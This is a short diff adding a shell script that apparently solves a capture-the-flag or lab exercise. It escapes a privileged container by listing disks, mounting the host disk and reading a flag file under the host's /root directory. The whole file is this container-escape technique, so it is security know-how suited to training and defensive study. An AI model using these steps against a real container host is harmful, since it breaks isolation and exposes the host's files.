@@ -1,0 +1,9 @@
+# checking if we are able to mount disks
+fdisk -l
+
+# disk is found, lets mount it to some directory
+mkdir -p /mnt/host-fs
+mount /dev/vda1 /mnt/host-fs
+
+cd /mnt/host-fs/root/01_priveleged/
+cat flag
